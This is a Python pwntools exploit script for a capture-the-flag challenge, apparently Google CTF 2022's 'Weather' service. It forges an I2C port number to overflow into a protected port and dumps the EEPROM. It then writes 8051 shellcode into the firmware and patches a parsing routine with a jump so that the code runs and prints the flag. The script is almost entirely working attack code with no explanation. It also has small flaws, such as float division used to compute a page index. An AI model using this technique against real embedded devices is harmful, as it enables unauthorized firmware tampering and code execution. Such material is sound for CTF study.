#!/usr/bin/env python3
from pwn import *

def send_read(dest_port, req_len):
    # forge port number to overflow into requested port number
    cmd = 'r 1010000{} {}'.format(dest_port + 128, req_len)
    
    # send i2c command
    print('cmd: %s' % cmd)
    r.sendline(cmd.encode())
    
    # show i2c response
    print('response: %s' % r.recvline())
    
    # read and parse response
    data = r.recvuntil('\n-end', drop = True)
    data = data.replace('\n', ' ').split(' ')
    res = ''.join(map(lambda x: chr(int(x)), data))
    
    print(hexdump(res))
    
    r.recvuntil('? ')
    
    return res

def send_write(dest_port, req_len, values):
    # forge port number to overflow into requestes port number
    cmd = 'w 1010000{} {}'.format(dest_port + 128, req_len)
    
    # append values
    for val in values:
        cmd += ' ' + str(val)
    
    # send i2c command
    print('cmd: %s' % cmd)
    r.sendline(cmd.encode())
    
    print(r.recvuntil('? '))

def write_eprom(page, data):
    # start package with page index and 4ByteWriteKey
    write_arr = [page, 0xa5, 0x5a, 0xa5, 0x5a]
    
    # add inverted byte as clear mask
    for b in data:
        write_arr.append(ord(b) ^ 0xff)
    
    # send package
    send_write(33, len(write_arr), write_arr)

def exploit(r):
    r.recvuntil('? ')
    
    # write flag dumper code to end of firmware
    write_eprom(40, '\x39\x00\xff\xff\x79\x00\xe9\xf5\xee\xe5\xef\xf8\xe5\xf3\x60\xfc\xe8\xf5\xf2\x09\x80\xf0')
    
    # write LJMP 0xa04 into str_to_uint8
    address = 0x341
    
    page = address / 64
    off = address % 64
    
    code = '\x00' * off
    code += '\x02\x0a\x04'
    
    write_eprom(page, code)
    
    # trigger str_to_uint8
    r.sendline(b'r 119')
    
    # print output (filter null bytes)
    while True:
        ch = r.recv(1)
        if ch != '\x00':
            sys.stdout.write(ch)
            
            r.interactive()

if __name__ == '__main__':
    r = remote('weather.2022.ctfcompetition.com', 1337)
    
    # dump eprom
    with open('eprom.bin', 'wb') as f:
        for i in range(0, 128):
            send_write(33, 1, [i])
            res = send_read(33, 64)
            
            f.write(res)
            f.flush()
    
    exploit(r)